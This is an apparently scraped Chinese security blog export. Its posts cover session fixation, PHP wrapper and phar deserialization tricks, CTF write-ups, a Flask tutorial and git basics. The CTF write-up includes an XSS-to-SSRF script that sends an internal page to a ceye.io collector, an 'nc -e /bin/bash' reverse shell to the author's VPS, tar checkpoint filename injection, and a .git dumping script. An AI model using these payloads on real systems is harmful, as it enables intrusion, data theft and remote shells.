name=&quot;zhanghao&quot;&gt;&lt;br/&gt;&lt;br/&gt; 用户密码：&lt;input type=&quot;password&quot; name=&quot;mima&quot;&gt;&lt;br/&gt;&lt;br/&gt; &lt;input type=&quot;hidden&quot; name=&quot;denglu&quot; value=&quot;&amp;#153;&amp;#187;&amp;#189;&amp;#149;&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;meta http-equiv=&apos;Set-Cookie&apos; content=&apos;PHPSESSID=22333&apos;&gt; &lt;/form&gt; &lt;script type=&apos;text/javascript&apos;&gt; document.cookie=&apos;PHPSESSID=123456789&apos; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 此时抓包可以看到，提交的SESSID是我们构造的，而且服务器端暂时未创建123456789的用户session，然后用户点击提交。 可以看到服务器端成功创建了我们构造的session，然后攻击者便可以通过PHPSESSID=123456789造成合法登陆，由此便造成了一次完整的会话固定劫持，当然如果是url传递将更加方便，直接在url里加入自己的sessionid，用户点击正常的url登陆即可。 cookie造成的一些安全隐患在session身份认证中，一切用户的session都会存储在服务器，但是如果一旦用户量达到一个上限，那么对于服务器的荷载也是巨大的，但是在cookie实现身份认证中，并不会存储在服务器，而是存储在用户的客户端，cookie的出现是一次重大的变革，也是一项非常有争议的技术，原因就是因为他的透明性以及信息量，很容易泄露用户的隐私。 在session如果不设置过期时间，在服务器上就会一直存在，永远不会注销，在cookie中如果不设置过期时间，则在关闭浏览器时销毁该cookie，session会给服务器造成很大的负载，但是cookie并不存在这个问题，它将信息保存在了每个用户的客户端。淘宝便是使用了cookie存储一部分信息。 信息泄露cookie中存取了大量用户的信息，如身份id，浏览次数，手机号，等一些隐私信息，截取了某平台的cookie信息，存储的信息量非常多，Cookie的主要功能是实现用户个人信息的记录，它最根本的用途是帮助Web站点保存有关访问者的信息，可是一旦泄露除了信息泄露，攻击者无疑也可以通过用户身份登录，无疑也是很大的隐患。 Cookie以纯文本的形式在浏览器和服务器之间传送，大多明文的形式被非法用户截获之后无疑是身份被盗取了，并且身份的信息也被盗取了，通过xss漏洞很容易获得cookie，如果没有做好防护措施，便会使用户的信息泄露。 越权在cookie的身份认证中，极容易造成越权，切大多数越权修改参数都是在cookie中修改，大多数cookie中会有用户的userid，如果未合理的处理或者多重认证，很容易造成越权。在某安全公司的一次测试中，正是由于一次id的接口错误的设置，导致数万用户的平行越权，遍历ID，造成信息的泄露。危害可见一斑。 参考：https://blog.csdn.net/h_mxc/article/details/50542038参考：https://blog.csdn.net/u010084228/article/details/78269345]]></content>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php的协议漏洞]]></title>
    <url>%2F2018%2F12%2F25%2Fphp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[1.php://input在php中，如果配置文件开启不当，则可能造成php://input来getshell 命令执行。 前提 1.在allow_url_include = On 2.PHP &gt;= 5.2.0 当然如果开启了远程文件包含则可以任意getshell。不过在一些攻防赛中，节约时间直接php://input则可能更快的得分留后门。 首先在php.ini 文件打开设置如上第一个条件。源码 &lt;?php include($_GET[&apos;url&apos;]); ?&gt; 直接进行包含即可， 当然这种情况一般不可能出现在实战中，CTF中可能会用到，或者一些隐蔽后门。 2.php://filter在一些CTF中，经常用到文件包含造成任意文件源码读取。同样漏洞源码 &lt;?php include($_GET[&apos;url&apos;]); ?&gt; http://127.0.0.1/000.php?url=php://filter/read=convert.base64-encode/resource=./index.php 3.phar://绕过上传getshell在一些过滤上传，只允许上传jpg文件的时候，可以通过phar://协议来绕过上传造成getshell。接下来实例，上传php的一段代码。 &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); if($_FILES[&quot;file&quot;][&quot;error&quot;]&gt;0) { echo &quot;Error:&quot;.$FILES[&quot;file&quot;][&quot;error&quot;].&quot;&lt;br/&gt;&quot;; } else { echo &quot;Upload name:&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;].&quot;&lt;br/&gt;&quot;;#被上传文件的名称 echo &quot;Type:&quot;.$_FILES[&quot;file&quot;][&quot;type&quot;].&quot;&lt;br/&gt;&quot;;#上传文件的类型 echo &quot;size:&quot;.($_FILES[&quot;file&quot;][&quot;size&quot;]/1024).&quot;kb&lt;br/&gt;&quot;;#上传文件的大小（kb） echo &quot;Stored in:&quot;.$_FILES[&quot;file&quot;][&quot;tmp_name&quot;].&quot;&lt;br/&gt;&quot;;#存储在服务器的文件的临时副本的名称 } $waf = explode(&quot;.&quot;, $_FILES[&apos;file&apos;][&apos;name&apos;]); if(end($waf)==&quot;jpg&quot;) { if(file_exists(&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;])) { echo $_FILES[&quot;file&quot;][&quot;name&quot;].&quot; already exists&quot;; } else { move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]); echo &quot;Stored in :&quot; .&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]; } } else{ echo &apos;&lt;script&gt;alert(&quot;不允许上传的类型&quot;)&lt;/script&gt;&apos;; } ?&gt; &lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;/&gt; &lt;br/&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot;/&gt; &lt;/form&gt; 这段代码（粗略的写了一波，其他方式随便绕过）设置只允许jpg上传，但是在某些条件下我们可以通过文件包含来造成绕过上传配合包含getshell。 还是配合漏洞代码。 &lt;?php include($_GET[&apos;url&apos;]); ?&gt; 我们先创建一个php文件，然后写马进去，然后解压，解压之后修改后缀名为jpg，然后再利用phar协议读取文件，通过包含造成getshell。 其实既然存在文件包含，并不需要phar读取，单纯jpg文件包含也会以php解析，但是这不失为一种猥琐思路，在一些ctf中还是经常能遇到的。 phar造成的反序列化漏洞。环境apache+php5.4php.ini中必须设置phar.readonly=Off，不然Phar文件就会无法生成。前面的分号注意去掉。 前言，在php中对一个文件压缩时候，部分信息会序列化，而配合 file_exists（ ），is_dir（）等文件解析文件时会进行反序列化，而造成反序列化漏洞。接下来我们详解。 1.a stub可以理解为一个标志，格式为xxx&lt;?php xxx; HALT_COMPILER();?&gt;，前面内容不限，但必须以HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。 2.核心meta-data phar文件本质上是压缩文件，我们通过phar协议来读取压缩文件。在压缩的时候，压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data。我们通过这部分序列化，来造成后面的攻击。 3.被压缩的文件及内容并不重要，因为我们需要的是meta-data的反序列化。 4.a signature for verifying Phar integrity签名格式 先利用php代码生成phar文件。 &lt;?php class Test{ public $test=&quot;test&quot;; } @unlink(&quot;test.phar&quot;); $phar = new Phar(&quot;test.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $o = new Test(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件，内容无所谓。 $phar-&gt;stopBuffering(); //签名自动计算 ?&gt; 执行php文件生成test.phar的文件。，可以看到已经进行了序列化。 在使用Phar:// 协议流解析Phar文件时，Meta-data中的内容也会进行反序列化。 &lt;?php echo file_get_contents(&quot;phar://./test.phar/test.txt&quot;); ?&gt; 可以看到已经反序列化读到了phar文件里的test.txt php的许多文件系统函数在phar://解析时都会反序列化。 这里简单理解下， &lt;?php class TestObject { } @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $o = new TestObject(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); ?&gt; 先生成phar.phar文件。然后测试php代码。 &lt;?php class TestObject { public function __destruct() { echo &apos;Destruct called&apos;; } } if(file_exists($_GET[&apos;file&apos;])) exit; ?&gt; 可以看到输出了 Destruct called，成功执行了类TestObject。代码 if(file_exists($_GET[&apos;file&apos;])) exit; 相当于变成了 $o = new TestObject(); 在file_exists时候反序列化，还原了传入的php代码。 参考swpu的一道CTF题目–&gt;&gt; SimplePHP https://www.anquanke.com/post/id/168338]]></content>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[swpu第九届线上ctf]]></title>
    <url>%2F2018%2F12%2F21%2F%E7%AC%AC%E4%B9%9D%E5%B1%8Aswpuctf%2F</url>
    <content type="text"><![CDATA[前言在历届swpuctf中题质量都是比较高的，此次有幸第一次参加swpuctf，题质量确实很高。期待明年的题目- -！！！ 总结三道本次比赛的web题目。 1.有趣的邮箱注册首先打开页面。很正常的一个标准页面。没啥信息。 左上角有邮箱验证。打开邮箱验证。测试也并没有注入。还有个后台管理。 不允许外地访问。X-Forward-For:127.0.0.1 也不好使。这个时候应该是ssrf，但是并没有ssrf的点。这时候考虑注册邮箱的时候会返回注册的邮箱，那么应该会有XSS。XSS加载脚本导致ssrf。 但是有邮箱验证。需要绕过，利用双引号绕过邮箱注册。如 &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;@qq.com。 可以看到出现了弹窗。 此时可以加载js脚本了。 var a = new XMLHttpRequest(); a.open(&apos;GET&apos;, &apos;http://localhost:6324/admin/admin.php&apos;, false); a.send(null); b = a.responseText; location.href = &apos;http://3jma2m.ceye.io/d?&apos; + escape(b); poc &quot;&lt;script/src=http://47.106.xx.XX/11.js&gt;&lt;/script&gt;&quot;@qq.com 这里js写在我的vps主机上，执行js之后，将页面返回的信息以url的形式去访问。这里我们使用http://ceye.io来接收访问信息。 可以看到是个命令执行。 然后我们继续构造ssrf来执行命令反弹shell var a = new XMLHttpRequest(); a.open(&apos;GET&apos;, &apos;http://localhost:6324/admin/a0a.php?cmd=nc+-e+%2fbin%2fbash+47.106.xx.xx+8888&apos;, false); a.send(null); b = a.responseText; location.href = &apos;http://3jma2m.ceye.io/d&apos; + escape(b); 第二行注意反弹shell要编码 http://localhost:6324/admin/a0a.php?cmd=nc+-e+%2fbin%2fbash+47.106.xx.xx+8888 本地vps 监听 nc -lvvp 8888 此时我们可以看到反弹shell成功， 但是flag文件需要权限，而我们权限看不到。此时寻找目录发现一个没见过的目录。 打开url http://118.89.56.208:6324/4f0a5ead5aef34138fcbf8cf00029e7b/ 看到上传和备份文件瞬间就想到了上传文件备份拿shell。但是这里发现上传php文件也可以，那很清楚问题不简单。上传之后找不到路径。经过一番思索，他确实不给路径你也找不到。此时，利用该刚刚的低权shell。查看一个可以看的文件 backup.php。 &lt;?php include(&quot;upload.php&quot;); echo &quot;上传目录：&quot; . $upload_dir . &quot;&lt;br /&gt;&quot;; $sys = &quot;tar -czf z.tar.gz *&quot;; chdir($upload_dir); system($sys); if(file_exists(&apos;z.tar.gz&apos;)){ echo &quot;上传目录下的所有文件备份成功!&lt;br /&gt;&quot;; echo &quot;备份文件名: z.tar.gz&quot;; }else{ echo &quot;未上传文件，无法备份！&quot;; } ?&gt; 所有东西都很正规。唯一有一句看着有点像有问题的样子。 $sys = &quot;tar -czf z.tar.gz *&quot;; chdir($upload_dir); system($sys); system 敏感函数。可能问题出在这里。然后就有了下面这篇文章， https://blog.csdn.net/qq_27446553/article/details/80943097 读完之后发现这里会有一个命令执行。猜测。应该是需要用flag的身份来查看flag文件。也就是利用flag权限执行命令。 poc为： 上传三个文件。 名字分别为。 6.sh --checkpoint-action=exec=sh 6 --checkpoint=1 然后备份文件。看上面那篇文章就可以了。重点在–。导致命令执行。得到flag。 对我来说很喜欢这道题，学到了很多。 2.Injection ???nosql注入。 这道题相对比较简单。但是在我的知识盲区。还是记录下。 打开就是个登陆框，弱口令万能密码注入，全都无效。题目给的名字是注入。试了半天，总不可能毫无人性的不是注入把。但是确实没弄出来，涉及到知识盲区了。nosql注入。不晓得的可以百度了解下，也就是对一些不适用于sql语句的数据库。我们需要用非sql语句来注入。 查看页面源码有个提示。 &lt;!-- tips:info.php --&gt; 查看phpinfo，显示拓展是mongodb数据库，那应该就是nosql注入了。参考文章链接：https://www.secpulse.com/archives/3278.html 简单说一下，也就是利用php的传递参数的松散性。我们可以传递数组。而因为mongodb数据库解析参数的特性，可以通过正则来采猜解账号密码。 给出一组poc。我们先匹配账号 所以密码 写为password[$regex]=1？也就是匹配1一次或0次，不论如何都会为真。按照这个套路就可以匹配完账号。账号为admin，所以匹配为真。如果username[$regex]=b，则会说账号密码错误。这样逐为爆破出账号密码登陆即可弹出flag。 3.用优惠码 买个 X ？本来想写flask那个python题，奈何没学过python开发，实在头疼。 这道题涉及到php伪随机数，也是第一次遇到，学习一下。 首先注册一个账号会给你一个十五位的邀请码，邀请码是随即种子生成的，利用邀请码来进行下一步的绕过。这里先说第一步，重点也是第一波php伪随机数的爆破。 www.zip源码泄露。get源码 通读源码。. &lt;?php //生成优惠码 $_SESSION[&apos;seed&apos;]=rand(0,999999999); function youhuima(){ mt_srand($_SESSION[&apos;seed&apos;]); $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $auth=&apos;&apos;; $len=15; for ( $i = 0; $i &lt; $len; $i++ ){ if($i&lt;=($len/2)) $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1); else $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1); } setcookie(&apos;Auth&apos;, $auth); } //support if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip)){ if (!preg_match(&quot;/\?|flag|}|cat|echo|\*/i&quot;,$ip)){ //执行命令 }else { //flag字段和某些字符被过滤! } }else{ // 你的输入不正确! } ?&gt; 不难发现，这是两端php，第一段是php伪随机数，第二个是下一步绕过。 通读第一部分源码，从一串构造的字符串中选取字符来构造为15长度的随即码，其实并不随机。因为一旦你知道了mt_rand，那么这串数字还是随机的吗，显然并不是，为什么说随机数并不随机，我们来进行下如下测试。 &lt;?php mt_srand(10); echo mt_rand(); ?&gt; 自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 给随机数发生器播种 ，因为现在是由系统自动完成的。 简单的如上代码，其实进行播种10。你会发现打印出来mt_rand() 始终为502355954，也就是。在实际情况中不再需要mt_srand播种，上图简单测试下，种子确定的话，随机数也将是确定的。实际情况中mt_rand()即可产生随机数，种子范围为(0,999999999)，也就是会产生十亿个随机数，这个时候发现如果有这么一个爆破工具，那么随机数不再随机我们只需要爆破出种子即可。 经过上面的解释，你现在是不是对随机数有些了解了。结合题目，只要我们知道种子，即可生成二十四位的优惠码，然后即可进行下一步操作。但是这咯需要提示的是，php不同版本随机数是不一样的，如7.0与7.2不一样，所以如果你要和题目中的php版本严格匹配才能爆破出正确的种子。 推荐一款工具 php_mt_seed-4.0 &lt;?php $allowable_characters = &apos;abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789&apos;; $len = strlen($allowable_characters) - 1; $pass = $argv[1]; for ($i = 0; $i &lt; strlen($pass); $i++) { $number = strpos($allowable_characters, $pass[$i]); echo &quot;$number $number 0 $len &quot;; } echo &quot;\n&quot;; ?&gt; 此题爆破脚本官方writeup上有，生成 交给 php_mt_seed-4.0即可， 对于RCE绕过。 if (preg_match(“/^\d+.\d+.\d+.\d+$/im”,$ip)){重点在参数m。 当这个修饰符设置之后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外， 还分别匹配目标字符串的最开始和最末尾位置。这等同于 perl 的 /m 修饰符。如果目标字符串 中没有 “n” 字符，或者模式中没有出现 ^ 或 $，设置这个修饰符不产生任何影响。也就是说 ^和$会匹配 字符串中n之前和之后，也会匹配整个字符串的开始和结尾，但是只要匹配到一个就会返回正确 绕过选择 [c]at [f][l][a][g]。linux中会匹配[]中任意一个字符，或者 选择转义 ca\t f\lag]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Flask从零到无]]></title>
    <url>%2F2018%2F12%2F14%2Fflask%E4%BB%8E0%E5%88%B0%E6%97%A0%2F</url>
    <content type="text"><![CDATA[零基础学起学习flask我选择了 pycharm，学生的话可以免费下载专业版。废话不多说了。 环境：python 3.6+基础：0-日期：2018.12.14 flask入门简单测试pycharm安装flask会自动导入了flask所需的模块，所以我们只需要命令安装所需要的包就可以了，建议用python3.6学习而不是2.7，毕竟django都快要不支持2.7了，早换早超生。 自动导入的也是python 3.6。 运行这边会出小错，因为此时我们还没有安装flask包， 这样就可以正常运行了，运行成功便会返回 * Debug mode: off * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit) 127.0.0.1 - - [14/Dec/2018 20:32:20] &quot;GET / HTTP/1.1&quot; 200 - 127.0.0.1 - - [14/Dec/2018 20:32:20] &quot;GET /favicon.ico HTTP/1.1&quot; 404 - 此时可以在web上运行hello world了，访问http://127.0.0.1:5000。可以看到打印出Hello World route装饰器路由@app.route(&apos;/&apos;) 使用 route() 装饰器告诉 Flask 什么样的URL 能触发我们的函数。 route() 装饰器把一个函数绑定到对应的 URL 上，这句话相当于路由，一个路由跟随一个函数，如 @app.route(&apos;/&apos;) def test()&quot; return 123 访问127.0.0.1:5000/ 则会输出123，我们修改一下规则 @app.route(&apos;/test&apos;) def test()&quot; return 123 这个时候访问127.0.0.1:5000/test 会输出123。此外还可以设置动态url， @app.route(&quot;/hello/&lt;username&gt;&quot;) def hello_user(username): return &quot;user:%s&quot;%username 根据url里的输入，动态辨别身份，此时便可以看到如下页面： 或者可以使用int型，转换器有下面几种： int 接受整数 float 同 int ，但是接受浮点数 path 和默认的相似，但也接受斜线 @app.route(&apos;/post/&lt;int:post_id&gt;&apos;) def show_post(post_id): # show the post with the given id, the id is an integer return &apos;Post %d&apos; % post_id main入口当.py文件被直接运行时，if name == ‘main‘之下的代码块将被运行；当.py文件以模块形式被导入时，if name == ‘main‘之下的代码块不被运行。如果你经常以cmd方式运行自己写的python小脚本，那么不需要这个东西，但是如果需要做一个稍微大一点的python开发，写 if name ==’main__’ 是一个良好的习惯，大一点的python脚本要分开几个文件来写，一个文件要使用另一个文件，也就是模块，此时这个if就会起到作用不会运行而是类似于文件包含来使用。 if __name__ == &apos;__main__&apos;: app.debug = True app.run() 测试的时候，我们可以使用debug，方便调试，增加一句 app.debug = True 或者（效果是一样的） app.run(debug=True) 这样我们修改代码的时候直接保存，网页刷新就可以了，如果不加debug，那么每次修改代码都要运行一次程序，并且把前一个程序关闭。否则会被前一个程序覆盖。 app.run(host=&apos;0.0.0.0&apos;) 这会让操作系统监听所有公网 IP,此时便可以在公网上看到自己的web。 http请求方法页面需要get请求或者post请求也可以由路由来解决，通过 route() 装饰器传递 methods 参数。如我们要在登录页面使用get或者post登录输入。 @app.route(&apos;/login&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;]) def login(): if request.method == &apos;POST&apos;: do_the_login() else: show_the_login_form() 模版渲染何为模版渲染 点击连接—&gt;&gt;&gt; https://shuaizhupeiqi.github.io/2018/11/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ 你可以使用 render_template() 方法来渲染模板。你需要做的一切就是将模板名和你想作为关键字的参数传入模板的变量。这里有一个展示如何渲染模板的简例: 简单的模版渲染示例 from flask import render_template @app.route(&apos;/hello/&apos;) @app.route(&apos;/hello/&lt;name&gt;&apos;) def hello(name=None): return render_template(&apos;hello.html&apos;, name=name) flask简单实例我们从模板渲染开始实例，因为我们毕竟不是做开发的，flask以模板注入闻名，所以我们先从flask模版渲染入手深入剖析。 首先要搞清楚，模板渲染体系，render_template函数渲染的是templates中的模板，所谓模板是我们自己写的html，里面的参数需要我们根据每个用户需求传入动态变量。 ├── app.py ├── static │ └── style.css └── templates └── index.html 我们写一个index.html文件写templates文件夹中。 &lt;html&gt; &lt;head&gt; &lt;title&gt;{{title}} - 小猪佩奇&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello, {{user.name}}!&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; 里面有两个参数需要我们渲染，user.name，以及title 我们在app.py文件里进行渲染。 @app.route(&apos;/&apos;) @app.route(&apos;/index&apos;)#我们访问/或者/index都会跳转 def index(): user = {&apos;name&apos;: &apos;小猪佩奇&apos;}#传入一个字典数组 return render_template(&quot;index.html&quot;,title=&apos;Home&apos;,user=user) 这次渲染我们没有使用用户可控，所以是安全的，如果我们交给用户可控并且不过滤参数就有可能造成SSTI模板注入漏洞。jinja2模板同样支持控制语句，在｛% %｝中输入我们的代码。如 {% if title %} {{title}} - xzpq {% else %} Welcome to xzpq {% endif %} 如果传入title参数那么执行 &lt;title&gt;{{title}} - xzpq&lt;/title&gt; 否则执行 &lt;title&gt;Welcome to xzpq&lt;/title&gt; 最后执行下面未写出。 本文暂且到这里，主要是为了配合ssti模板注入而了解flask注入。看继续参考博文SSTI模板注入。 测试的代码贴上 from flask import Flask from flask import render_template from flask import request from flask import render_template_string app = Flask(__name__) @app.route(&apos;/login&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;]) def login(): if request.method == &apos;POST&apos;: do_the_login() else: show_the_login_form() @app.route(&apos;/&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;]) @app.route(&apos;/index&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])#我们访问/或者/index都会跳转 def index(): return render_template(&quot;index.html&quot;,title=&apos;Home&apos;,user=request.args.get(&quot;key&quot;)) @app.route(&apos;/test&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;]) def test(): template = &apos;&apos;&apos; &lt;div class=&quot;center-content error&quot;&gt; &lt;h1&gt;Oops! That page doesn&apos;t exist.&lt;/h1&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/div&gt; &apos;&apos;&apos; %(request.url) return render_template_string(template) if __name__ == &apos;__main__&apos;: app.debug = True app.run() 参考：http://www.pythondoc.com/flask-mega-tutorial/]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南邮CTF-2018]]></title>
    <url>%2F2018%2F12%2F06%2F%E5%8D%97%E9%82%AECTF-2018%2F</url>
    <content type="text"><![CDATA[全球最大交友网站进入网站是一个时钟。并没什么思路，只能拿工具扫一下了。.git禁止访问，可能存在git源码泄露。用lijiejie的工具，下载源码发现没啥乱用，一个readme.txt。本来没想点进去，发现确实有提示 Allsource files areingit tag1.0 这意思是所有的源码都在 tag1.0中，也就是不在这个版本中。也就是说这个版本他把仓库东西给删除了，你如果想要1.0版本必须要回溯到1.0版本。不过既然有.git按道理说都是可以看到的。一个工具给大家。 #!/bin/bash # # Author: Denny Huang &lt;denny0223@gmail.com&gt; # Wed Sep 17 2014 # MIT License function downloadBlob { echo downloadBlob $1 mkdir -p ${1:0:2} cd $_ wget -q -nc $domain/.git/objects/${1:0:2}/${1:2} cd .. } function parseTree { echo parseTree $1 downloadBlob $1 while read line do type=$(echo $line | awk &apos;{print $2}&apos;) hash=$(echo $line | awk &apos;{print $3}&apos;) [ &quot;$type&quot; = &quot;tree&quot; ] &amp;&amp; parseTree $hash || downloadBlob $hash done &lt; &lt;(git cat-file -p $1) } function parseCommit { echo parseCommit $1 downloadBlob $1 tree=$(git cat-file -p $1| sed -n &apos;1p&apos; | awk &apos;{print $2}&apos;) parseTree $tree parent=$(git cat-file -p $1 | sed -n &apos;2p&apos; | awk &apos;{print $2}&apos;) [ ${#parent} -eq 40 ] &amp;&amp; parseCommit $parent } [ -z $1 ] &amp;&amp; echo -e &quot;missing target url\n\n\ Usage: scrabble &lt;url&gt;\n\ Example: scrabble http://example.com/\n\n\ You need make sure target url had .git folder&quot;\ &amp;&amp; exit domain=$1 ref=$(curl -s $domain/.git/HEAD | awk &apos;{print $2}&apos;) lastHash=$(curl -s $domain/.git/$ref) git init cd .git/objects/ parseCommit $lastHash cd ../../ echo $lastHash &gt; .git/refs/heads/master git reset --hard 用法如图注意 scrabble 是我上面脚本的名字。无需后缀，要在linux bash运行 之后便可以当作自己的git仓库来使用。如 git log 上面是我本地测试自己的代码。我们回归正题。因为题目已经关了，没法复现题目中的git,意思就是git log，查看到各个版本的版本号，然后 git show HEAD 版本号查看进行了什么修改增加便可以看到flag。 root@xiaozhupeiqi:/scrabble# git show HEAD cf36b7a28707d581e4c5be4a2061ad41c9d386e2 小绿草之最强大脑 前言：比赛结束后测试的，自我认为是环境问题，使用别人的poc也跑不出来flag，就当自己练习脚本了。 先贴出脚本自写（未验证准确性） import requests import re import time url=&apos;http://127.0.0.1/2/index.php&apos; s=requests.Session() r=s.get(url) while(1): a = r.content[1600:4250].decode(encoding=&apos;utf-8&apos;) matchp = re.findall(r&apos;[0-9\+\-\*]&apos;,a) a=&quot;&quot; for i in matchp: a=a+i b=&quot;&quot; map=re.findall(r&apos;[1-9]+[0]*[1-9]+[0]*[1-9]+[0]*[1-9]+[\+\-\*]*&apos;,a) for i in map: b=b+i b=&apos;9223372036854775807+&apos;+b print b print eval(b) c=eval(b) payload={&apos;input&apos;:&apos;1111111111111111111111&apos;,&apos;ans&apos;:c} r=s.post(url,data=payload) time.sleep(1.5) print r.content.decode(encoding=&apos;utf-8&apos;) 分析：此题中一看场面应该是自写脚本然后计算结果快速提交。但是肯定会有考其他的知识点。以后看到ctf先扫一波，扫到源码 源码中有一很重要的知识点知识点 1 if(($_SESSION[&apos;ans&apos;])+intval($_POST[&apos;input&apos;])!=$_POST[&apos;ans&apos;]){ intval 是防止程序溢出的函数，32位系统溢出最大：2147483647 64位系统溢出最大：9223372036854775807，检测为64位系统，所以你提交22位的数字会自动转化为 9223372036854775807，所以脚本计算的时候要使用 9223372036854775807 而不是22位自己input的数字。 知识点2 if(intval(time())-$_SESSION[&apos;time&apos;]&lt;1){ session_destroy(); echo &apos; &lt;script language=&quot;javascript&quot;&gt; alert(&quot;你手速太快啦，服务器承受不住!!!&quot;); window.history.back(-1); &lt;/script&gt; &apos;; } 源码中指定不能提交速度太快，在github上下载的所有源码规定的是如果你提交五次正确答案就给你flag，但是你不能提交太快，我们使用函数time.sleep(1.5)，定义1.5S 提交一次。 知识点3 正则，我是没写过几次正则的，所以写的很辣鸡，是真的辣鸡，匹配有点鸡肋，说不清自己体会把。。 知识点4 必须要做一个session，因为需要一个用户提交五次及以上。 知识点5 findall函数要学清楚，细心！就完事。 脚本运行截图 不要问我为什么没算对，应该是直接下载源码环境不对，算是肯定算对了的，网上下载的poc也同样没跑出来flag，应该是环境嗯，环境问题。 Go Lakers进去之后发现网站跳转302，抓包，看到最下面，（我发现CTF不细心的人做不出来还会原地爆炸）post 一个 viewsource参数就好看到源码 if(!(getip() === &apos;127.0.0.1&apos; &amp;&amp; file_get_contents($_GET[&apos;9527&apos;]) === &apos;nctf_is_good&apos; &amp;&amp; mt_rand(1,10000) === intval($_GET[&apos;go_Lakers&apos;]))){ header(&apos;location:https://bbs.hupu.com/24483652.html?share_from=kqapp&apos;); }else{ echo &apos;great&apos;; } 这玩意是**骗人的，不用绕我日！自己体会。利用最后一句源码 就是读取文件就完事 echo file_get_contents(de_code($_GET[&apos;file_&apos;])); 将function逆向编写，然后顺理成章的下面就会读取文件。flag.php就在当前文件下，直接读就行了 逆向代码 for($i=0;$i&lt;strlen($value);$i++){ $result .= chr(ord($value[$i])+$i*2); } $result=base64_encode($result); echo $result; value输入想读的文件输入flag.php 转换成Zm5lbTZ6dH4=然后提交file_=Zm5lbTZ6dH4=就可读取flag.php千万不要被骗了，哭了！]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git使用与部署github]]></title>
    <url>%2F2018%2F12%2F04%2Fgit%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[GIT是什么GIT是先进的分布式版本控制系统，既然是分布式控制系统，那么就是没有中央服务器的，每个终端都可以是一个完整的库，如果家庭单位两台电脑如何修改库呢，只需要推送给对方进行修改即可。既然是分布式，每台电脑就可以是一个库那么也就自然不需要连接服务器进行上传了，不过接下来我们要介绍到上传github上。 git有什么好处git最大的好处就是方便，好吧，如何方便呢，他可以自由回退各个版本，就是你对一个库的任何修改他都会保存，如果你用不到那么可以不用知道他的存在，如果你需要，他可以调用出来你以前的版本。举个例子。 一个版本库存放一个项目，并且已经推送到github上供人下载，此时你要更新到下一个版本，进行修改推送到网站上，但是你发现有一个大bug，但是时间太久记不清修改了哪里，毕竟那么多细节，此时就可以用git按照日期回退版本，在进行从新开发。对任意时间段的版本重置。并且你可以对每次改动增加一个备注，比如： 版本 文件名 操作人 说明 日期 1 test.txt guest 增加项目1 2018.1.1 2 test.txt admin 删除第五行 2018.2.1 2 test.txt admin 修改管理员密码 2018.2.1 这样可以极大方便开发人员操作人员的修改推送。 windows下gitbash在windows下安装git工具，下载安装网上教程自寻。 然后打开gitbash，一个git命令行，一些linux命令 windows命令可以使用，自己体会下。 一切的操作都基于git bash操作，接下来我们详解git命令。 git命令学习git init //把这个目录变成git可以管理的仓库.git目录是Git来跟踪管理版本的，不要轻易改动。2.创建文件夹 mkdir test 创建文件 touch 1.txt 3.传送到我们的仓库 git add 1.txt 